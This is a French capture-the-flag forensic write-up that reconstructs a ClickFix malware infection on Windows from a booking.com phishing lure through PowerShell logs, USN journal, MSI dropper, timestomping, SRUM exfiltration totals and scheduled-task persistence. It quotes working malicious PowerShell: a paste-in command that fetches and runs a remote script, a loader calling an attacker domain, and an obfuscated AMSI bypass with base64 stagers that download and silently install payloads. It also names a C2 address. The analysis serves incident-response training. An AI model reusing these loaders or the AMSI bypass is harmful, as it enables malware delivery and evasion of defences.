---
title: CATathon 2026 - Glyph
time: 2026-09-12 09:00:00
categories: [ctf]
tags: [forensic, DFIR, network, misc]
image: /assets/posts/catctf2026/cover.png
---

Le writeup peut paraître un peu long, surtout si vous n'êtes pas débutant, car je vais essayer d'expliquer à ma façon afin que tout le monde puisse me suivre.

Vous êtes prêt ? Let's go.

# Forensic

## Glyph

### Ce qu'on nous donne

```bash
ls
2025-08-17T01_50_45_2520944_CopyLog.csv  2025-08-17T01_50_45_2520944_SkipLog.csv.csv  C  LongFileNames
```

---

### Question 1 : `What is the url that mislead the user to click and cause the whole infection?`

Pour analyser l'activité récente de l'utilisateur dans le navigateur, il faut d'abord identifier le navigateur utilisé. On peut déterminer les programmes graphiques lancés le plus récemment en examinant l'artefact **UserAssist**.

Les données UserAssist sont stockées dans la ruche de l'utilisateur `NTUSER.DAT`, à l'emplacement `Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist`. Cet artefact est très intéressant pour savoir combien de fois un programme a été utilisé.

Selon moi, une meilleure alternative est l'Activity User, situé à `C:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db` :

```bash
wine ~/Downloads/tools/Eric/WxTCmd.exe -f ActivitiesCache.db --csv .
```

![activity](/assets/posts/catctf2026/activity_glyph.png)

En parsant l'activité, on voit que Edge a été utilisé par l'utilisateur entre 16h21 et 16h35.

Je consulte ensuite l'historique du navigateur :

```
C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\History
```

Pour cela, j'utilise directement Hindsight, un très bon outil pour lister la chronologie de l'historique :

```bash
python ~/Downloads/tools/hindsight/hindsight_gui.py
```

À cette date, on voit que l'utilisateur a essayé de consulter booking.com à plusieurs reprises. Au premier abord, on ne voit peut-être rien qui ressemble à une tentative d'hameçonnage. Mais si l'on regarde attentivement, on remarque ceci :

```
https://account.booking.xn--comdetailrestric-access-ge5vga.www-account-booking.com/en/
```

à 2025-08-14 16:22:57.058692.

Dans cette URL, `account.booking` n'est pas le vrai domaine : il fait partie du sous-domaine, tandis que le véritable domaine est `www-account-booking.com`. De plus, le préfixe `xn--` indique que cette partie du domaine est encodée en Punycode, ce qui signifie qu'elle contient des caractères Unicode différents des caractères ASCII classiques.

Cela ne suffit cependant pas à affirmer que le domaine est malveillant. Vérifions-le donc sur VirusTotal.

![virus](/assets/posts/catctf2026/virustotal.png)

On a la preuve que c'est du phishing. Utilisez CyberChef pour décoder le Punycode et révéler la véritable forme Unicode de l'URL.

![cyberchef](/assets/posts/catctf2026/punycode.png)

```
https://account.booking.comんdetailんrestric-access.www-account-booking.com/en/
```

---

### Question 2 : `At what precise time did the user begin following the deceptive steps on the system that ultimately resulted in the infection?`

Il faut d'abord savoir ce qui s'est passé après l'arrivée sur le site. Pour cela, on regarde le **Prefetch**. C'est un mécanisme d'optimisation de Windows : à chaque démarrage d'un programme, Windows écrit un fichier `.pf` dans `C:\Windows\Prefetch\`, qui contient la date des dernières exécutions **et la liste des fichiers que le programme a ouverts**. Je suis donc directement allé voir ce qu'il contenait :

![pf](/assets/posts/catctf2026/pf.png)

Sur mon Windows, je lance :

```
Z:\tools\Eric\PECmd.exe -d "Z:\prefetch" --csv "Z:\out_pf"
```

En lisant le CSV produit par PECmd, on voit que PowerShell a été lancé à 16h23.

![ph](/assets/posts/catctf2026/powershell.png)

On parse donc le fichier EVTX de PowerShell :

```bash
wine ~/Downloads/tools/Eric/EvtxeCmd/EvtxECmd.exe -f Windows\ PowerShell.evtx --csv .
```

![cmd](/assets/posts/catctf2026/commande.png)

On constate qu'une commande PowerShell a été exécutée à 2025-08-14 16:23:29. À la fin de la commande, on voit la chaîne `Ray ID: 977c4b811d37ede8`. Elle est souvent associée aux attaques **ClickFix**, qui incitent l'utilisateur à coller une commande dans la boîte de dialogue Exécuter.

On peut ensuite vérifier la clé RunMRU de la ruche de l'utilisateur afin de savoir quand il a saisi cette commande. La clé RunMRU enregistre toutes les commandes saisies dans la boîte Exécuter. Chemin : `Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`

![rundia](/assets/posts/catctf2026/rundiag.png)

| Source | Heure | Interprétation |
|---|---|---|
| RunMRU (Registry Explorer) | 16:23:28 | L'utilisateur valide la commande dans Win+R |
| EVTX Windows PowerShell (EvtxECmd) | 16:23:29 | PowerShell démarre (événements 600, puis 400) |
| EVTX, événement 800 | 16:23:31 | Exécution du pipeline, 2 s plus tard |

---

### Question 3 : `After the user took the first action to execute the remote script, that script retrieved the next-stage malware code from another domain. What is the URL responsible for dropping that malware code onto the system?`

Maintenant que l'on sait que l'utilisateur a copié la commande PowerShell malveillante dans la boîte Exécuter, il faut vérifier si l'exécution de cette commande a été enregistrée sous forme de bloc de script dans le journal `Microsoft-Windows-PowerShell/Operational.evtx`. La différence principale est la suivante : `Windows PowerShell.evtx` est un journal hérité (Legacy) qui enregistre le démarrage et l'arrêt du moteur et des modules, tandis que `Microsoft-Windows-PowerShell/Operational.evtx` est le journal moderne et détaillé, indispensable à l'analyse, car il enregistre le contenu exact des scripts exécutés.

![powerope](/assets/posts/catctf2026/operationnal.png)

```
ScriptBlockText: $windowDefinition = @', [DllImport("user32.dll")], public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);, '@, $windowType = Add-Type -MemberDefinition $windowDefinition -Name "Win32ShowWindow" -Namespace Win32Functions -PassThru, $windowType::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0), Write-Host "Please wait...", try {,     $urlParts = @("htt", "p:/", "/www-", "acco", "unt-", "book", "ing", ".co", "m/c.php?a=0"),     $url = -join $urlParts,     ,     $request = [System.Net.WebRequest]::Create($url),     $request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",     ,     $response = $request.GetResponse(),     $stream = $response.GetResponseStream(),     $reader = [System.IO.StreamReader]::new($stream),     $scriptContent = $reader.ReadToEnd(),     ,     $reader.Close(),     $response.Close(),     ,     Invoke-Expression $scriptContent,     ,     $v = "671009", }, catch {,     Write-Host "Error occurred: $($_.Exception.Message)",     Start-Sleep 2, }
```

La commande PowerShell complète était la suivante :

```powershell
powershell -nop -ep bypass -c "try { iex (irm'https://gist.githubusercontent.com/M4shl3/cdda2ebce4dae530ac7f5a3e71bb4af6/raw/c2533c68f23c4cba6880c2a7a8fc78ba46eb0a4e/booking.ps1') } catch { Write-Host 'Error: $_' }; Write-Output 'Ray ID: 977c4b811d37ede8'"
```

Elle exécute un script nommé `booking.ps1`. Le contenu de ce fichier `.ps1` est ce qui est enregistré dans le journal Operational de PowerShell. Comme le montre le journal, le script télécharge une autre charge utile depuis le domaine `http://www-account-booking.com/c.php?a=0`, la stocke dans la variable `$scriptContent`, puis l'exécute.

Cette URL héberge un autre script PowerShell. Pour en connaître le contenu, on peut examiner ce domaine sur VirusTotal.

![powerope](/assets/posts/catctf2026/virustotal2.png)
![powerope](/assets/posts/catctf2026/urlhause.png)
![powerope](/assets/posts/catctf2026/urlhause2.png)
![powerope](/assets/posts/catctf2026/malwarebazar.png)

```powershell
$FEIfwuioehfaiwyYOETWTRuwye = "ams" + "iI" + "ni"+"tFa";$EF8034uowieypowiue = "iled";$Ceoiuwjoeuyfw = "System.Mana"+"gement."+"Automation.Ams"+"iUtils";$DFiowjhOHWOHEOUF = $null;
sleep 3;
$plaintext = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgkQ2VvaXV3am9ldXlmdykuR2V0RmllbGQoJEZFSWZ3dWlvZWhmYWl3eVlPRVRXVFJ1d3llICsgJEVGODAzNHVvd2lleXBvd2l1ZSwiTm9uUCIgKyAidWIiICsgImxpYyxTdCIgKyAiYXRpYyIpLlNldFZhbHVlKCRERmlvd2poT0hXT0hFT1VGLCR0cnVlKQ=="));
iex $plaintext
sleep 1;
$UPath = 'ism.FTGTDTYI/80.40/rp/nhoj/ten.ndc-b.erawtfossetadpu//:sptth'.ToCharArray();
$IPath = 'ism.FTGTDTYI/80.40/rp/nhoj/ten.ndc-b.erawtfossetadpu//:sptth'.ToCharArray();
$textA = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("W2FycmF5XTo6UmV2ZXJzZSgkVVBhdGgpOyRVUGF0aEE9KCRVUGF0aCAtam9pbiAnJyk7JHJhbmRXb3JkQSA9ICJ0ZW1wXyIgKyAtam9pbiAoKDY1Li45MCkgKyAoOTcuLjEyMikgfCBHZXQtUmFuZG9tIC1Db3VudCA2IHwgJSB7W2NoYXJdJF99KTs="));
iex $textA
$textB = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("W2FycmF5XTo6UmV2ZXJzZSgkSVBhdGgpOyRVUGF0aEI9KCRJUGF0aCAtam9pbiAnJyk7JHJhbmRXb3JkQiA9ICJ0ZW1wXyIgKyAtam9pbiAoKDY1Li45MCkgKyAoOTcuLjEyMikgfCBHZXQtUmFuZG9tIC1Db3VudCA2IHwgJSB7W2NoYXJdJF99KTs="));
iex $textB
$mE = 2;
if ($mE -eq 1) {
    $hinttext = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("JHBhdGhBID0gJGVudjp0bXAgKyAiXCIrJHJhbmRXb3JkQSsiLmV4ZSI7IGl3ciAkVVBhdGhBIC1vICRwYXRoQTsgc3RhcnQtcHJvY2VzcyAkcGF0aEE7"));
    iex $hinttext
}
elseif ($mE -eq 2) {
    $texthint = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("JHBhdGhBID0gJGVudjp0bXAgKyAiXCIrJHJhbmRXb3JkQSsiLm1zaSI7aXdyICRVUGF0aEEgLW8gJHBhdGhBO3N0YXJ0LXByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL2kiLCAkcGF0aEEsICIvcXVpZXQiLCAiL25vcmVzdGFydCI7"));
    iex $texthint
}
elseif ($mE -eq 3) {
    $hinttext = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("JHBhdGhBID0gJGVudjp0bXAgKyAiXCIrJHJhbmRXb3JkQSsiLm1zaSI7aXdyICRVUGF0aEEgLW8gJHBhdGhBO3N0YXJ0LXByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL2kiLCAkcGF0aEEsICIvcXVpZXQiLCAiL25vcmVzdGFydCI7"));
    iex $hinttext
    $texthint = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("JHBhdGhCID0gJGVudjp0bXAgKyAiXCIrJHJhbmRXb3JkQisiLmV4ZSI7aXdyICRVUGF0aEIgLW8gJHBhdGhCO3N0YXJ0LXByb2Nlc3MgJHBhdGhCOw=="));
    iex $texthint
}
```

---

### Question 4 : `D'après la question précédente, ce domaine hébergeait un script malveillant. Quelle est la première ligne du script qui prépare les variables pour le contournement AMSI ?`

Le script commence par préparer des variables obfusquées utilisées pour contourner AMSI, en définissant `amsiInitFailed` à `true`.

Il génère ensuite des noms de fichiers aléatoires avec le préfixe `temp_` suivi de six lettres aléatoires. Selon la branche sélectionnée, la charge utile téléchargée est enregistrée dans le dossier temporaire de l'utilisateur sous la forme d'un fichier `.txt`, `.exe` ou `.msi`.

Le fichier EXE est exécuté directement, tandis que le fichier MSI est exécuté silencieusement avec `msiexec`.

Réponse :

```powershell
$FEIfwuioehfaiwyYOETWTRuwye = "ams" + "iI" + "ni"+"tFa";$EF8034uowieypowiue = "iled";$Ceoiuwjoeuyfw = "System.Mana"+"gement."+"Automation.Ams"+"iUtils";$DFiowjhOHWOHEOUF = $null;
```

Ce code prépare plusieurs variables utilisées pour un contournement d'AMSI, afin que le script puisse s'exécuter sans être détecté.

---

### Question 5 : `Quel est le chemin d'accès complet du premier fichier déposé sur le système ?`

Tout d'abord, comme on l'a vu dans le script hébergé à l'adresse `http://www-account-booking.com/c.php?a=0`, un seul fichier, le MSI, est téléchargé et exécuté.

Le blog `https://x.com/JAMESWT_WT/status/1955060839569870991` contient une vidéo ANY.RUN. Selon la chaîne d'infection visible dans ANY.RUN, un fichier `.cmdline` supplémentaire est déposé. Ce fichier est chargé de lire le GUID de la machine et de détecter ses paramètres de langue.

![image](/assets/posts/catctf2026/anyrun.png)

On voit que le fichier `.cmdline` est téléchargé avant le fichier `.msi`. Il faut maintenant identifier son nom. Pour cela, on analyse le `$MFT` afin de repérer tous les enregistrements écrits et déterminer si le fichier existe encore ou a été supprimé.

```bash
wine ~/Downloads/tools/Eric/MFTECmd.exe -f '.\$MFT' --csv mftOUT
```

En filtrant sur l'extension `.cmdline`, on obtient 0 résultat : le fichier a donc bien été supprimé.

Il faut alors analyser le fichier `$J` (journal USN), situé à `C:\$Extend\$J`, car il contient les enregistrements de toutes les opérations de création, de modification et de suppression de fichiers.

La différence principale tient à leur rôle : la MFT décrit ce qu'est un fichier à un instant T, tandis que le journal USN raconte l'historique de ce qui lui est arrivé.

```bash
wine ~/Downloads/tools/Eric/MFTECmd.exe -f '.\$J' --csv mftOUT
```

![image](/assets/posts/catctf2026/usn.png)
![image](/assets/posts/catctf2026/usn2.png)

On constate qu'un seul fichier a été créé pendant la fenêtre de l'infection, à 2025-08-14 16:23:31, et supprimé une seconde plus tard : `22ukhacj.cmdline`.

- Entry Number : 103759
- Parent Entry Number : 103749

Pour identifier le dossier parent, il faut filtrer sur le Parent Entry Number (103749). On constate que le dossier s'appelle `22ukhacj`, avec un Parent Entry Number de 98335, qui correspond au dossier `Temp`. Le dossier `Temp` a lui-même pour parent `Local`.

Le chemin complet du fichier est donc :

```
C:\Users\Administrator\AppData\Local\Temp\22ukhacj\22ukhacj.cmdline
```

---

### Question 6 : `Lors de l'exécution du programme d'installation déposé, un exécutable est lancé, qui dépose ensuite le logiciel malveillant de deuxième niveau. Quel est le nom de cet exécutable ?`

D'après la chaîne d'infection, le fichier MSI est déposé dans le dossier `%AppData%\Temp`. En filtrant les fichiers MSI créés dans ce dossier, on ne trouve qu'un seul fichier MSI.

![image](/assets/posts/catctf2026/msi.png)

J'ai ensuite utilisé ce site pour visualiser et télécharger le contenu du MSI : `https://pymsi.readthedocs.io/en/latest/msi_viewer.html`

![image](/assets/posts/catctf2026/msidecompile.png)

En inspectant le contenu de cet installateur, on trouve l'exécutable responsable du dépôt des autres fichiers malveillants.

On constate que l'exécutable `EnginInf16.exe` est responsable du dépôt des fichiers secondaires. Ce MSI est le seul fichier téléchargé depuis le script PowerShell hébergé à l'adresse `http://www-account-booking.com/c.php?a=0`.

Pour confirmer l'analyse, la chaîne d'infection montre qu'`EnginInf16.exe` dépose deux exécutables supplémentaires : `XPFix.exe` et `TurIndex.exe`.

---

### Question 7 : `Lors de la distribution du logiciel malveillant de deuxième phase, une technique d'évasion de détection connue est employée. Quel est l'identifiant de cette technique MITRE ATT&CK ? (format : TXXXX.XXX)`

La deuxième phase consiste à déposer des fichiers malveillants supplémentaires, comme les exécutables vus dans la capture précédente. Pour approfondir, on examine le `$MFT` à la recherche d'enregistrements liés à ces fichiers autour de la fenêtre de l'infection, que l'on fixe à partir de 2025-08-14 16:23:28. On observe les événements suivants :

- À 2025-08-14 16:27:20, un nouveau dossier est créé sous `ProgramData`. Au même moment, un autre dossier est créé sous le répertoire `Roaming`.

En examinant ces dossiers, on remarque qu'ils contiennent tous deux le même exécutable : `NavigatorCobalt.exe`. Cependant, le dossier `Sacroiliac` a été enregistré dans le `$MFT` le 2025-08-07 à 01:49:22, soit avant la fenêtre de l'infection : il n'est donc pas lié à cet incident.

Un autre dossier, `Heresiarch`, se trouve dans le répertoire local. Sa date de création est antérieure à la fenêtre de l'infection, et il contient le même dropper (`EnginInf16.exe`) que celui téléchargé pendant la première étape de l'infection.

Plus tard, on découvre que les deux exécutables, `EnginInf16.exe` et `NavigatorCobalt.exe`, sont utilisés pour établir une persistance via des tâches planifiées. Leurs horodatages ont été modifiés (time-stomping) spécifiquement dans ce but.

Ce comportement correspond à la technique **TimeStomping** [T1070.006], par laquelle les attaquants modifient les horodatages des fichiers pour échapper à la détection et masquer la véritable chronologie de l'infection.

Une manière beaucoup plus rapide de trouver cette information aurait été d'utiliser :

```bash
wine ~/Downloads/tools/ntfs_log_tracer/NTFS_Log_Tracker.exe
```

![image](/assets/posts/catctf2026/ntfslogtracker.png)

Le fichier a bien été créé à 2025-08-14 16:25:10, mais ses horodatages ont été manipulés pour lui donner une date plus ancienne. Cette manipulation visait à dissimuler son lien avec la chaîne d'infection.

Réponse : `T1070.006`

---

### Question 8 : `Déterminez le nom du fichier binaire de vol de données qui initie la communication avec son serveur de commande et de contrôle (C2). Calculez ensuite le volume total de données exfiltrées en Mio. (format : nom_de_fichier.ext, x.xx)`

D'après la chaîne d'infection observée dans ANY.RUN, l'exécutable `EnginInf16.exe` dépose un autre fichier, `TurIndex.exe`, chargé de voler les données personnelles.

![steal](/assets/posts/catctf2026/steale.png)

Pour déterminer le nombre d'octets exfiltrés par cet exécutable vers le serveur C2, il faut analyser la base de données SRUM. Elle se trouve à l'emplacement `C:\Windows\System32\SRU`. Elle est utilisée par le Moniteur de ressources Windows et enregistre des informations détaillées, notamment le trafic réseau entrant et sortant, ainsi que d'autres ressources système.

J'ai utilisé le site `https://www.srumparser.com/en` :

![steal](/assets/posts/catctf2026/srum.png)

En examinant le fichier `NetworkUsages_Output.csv`, on constate que `TurIndex.exe` a transmis :

- 2 821 635 octets à partir de 2025-08-14 16:35:00
- 3 234 265 octets à partir de 2025-08-14 18:06:00

Total des données exfiltrées : 2 821 635 + 3 234 265 = 6 055 900 octets, soit environ **5,77 Mio**.

Réponse : `TurIndex.exe, 5.77`

---

### Question 9 : `Identifiez le nom de fichier d'origine du binaire secondaire qui établit une connexion avec un serveur de commande et de contrôle (C2).`

J'ai utilisé `srum_dump.exe` :

```bash
wine ~/Downloads/tools/srum_dump.exe
```

![process](/assets/posts/catctf2026/process2.png)

Ensuite, avec DIE, j'ai récupéré le hash du binaire et je l'ai recherché sur VirusTotal, qui m'a donné le nom d'origine :

![virus](/assets/posts/catctf2026/virustotal3.png)

```
2025-05-31_c39a4cca58bedd9b3ceda4d0d3e1e94a_amadey_cobalt-strike_darkgate_elex_hijackloader_mespinoza_smoke-loader
```

Ce nom apparaissait aussi dans le rapport Triage : `https://tria.ge/250531-2fwh9adl4y/behavioral1`.

---

### Question 10 : `Identifiez l'adresse IP du serveur de commande et de contrôle (C2) contacté par le binaire précédemment identifié.`

C'est la question la plus difficile pour moi : elle m'a pris plus de deux heures. J'ai essayé de chercher des chaînes dans l'exécutable avec `strings`, sans rien trouver d'utile. J'ai aussi tenté de lancer l'exécutable lui-même, sans obtenir la réponse.

J'ai consulté différents rapports d'analyse et writeups, mais les adresses IP changeaient à chaque fois. Après avoir ouvert un ticket auprès de l'auteur du challenge, il m'a conseillé d'analyser l'incident comme une chaîne complète, et non comme un seul exécutable.

Revenons donc à l'analyse de la timeline et suivons la chaîne d'infection pas à pas.

J'ai constaté que cet exécutable s'était lancé juste avant la seconde connexion C2. De plus, d'après le premier C2 et l'analyse ANY.RUN, on sait qu'un loader était responsable de son lancement.

Allons donc sur le chemin du fichier et analysons-le dynamiquement avec des outils comme Procmon, pour vérifier s'il lance le processus lié au C2.

Comme on le voit, le loader démarre et lance le second processus lié au C2.

On peut ensuite utiliser FakeNet-NG ou un autre outil d'analyse réseau pour capturer la connexion et identifier l'adresse IP du C2.

Réponse : `85.192.48.239`

---

### Question 11 : `Identifiez l'identifiant de la technique MITRE ATT&CK correspondant au mécanisme de persistance mis en place pendant l'infection. (format : TXXXX.XXX)`

Cette question est plus simple. En consultant le Planificateur de tâches Windows, on trouve une tâche planifiée qui exécute le loader.

Cela confirme que le malware utilisait une tâche planifiée pour relancer automatiquement le loader :

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\ToolWizard</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>WIN-SQGD1B17I85\Administrator</UserId>
    </LogonTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\ProgramData\updatebrowserv4\NavigatorCobalt.exe</Command>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>WIN-SQGD1B17I85\Administrator</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
</Task>
```

Réponse : `T1053.005`

---
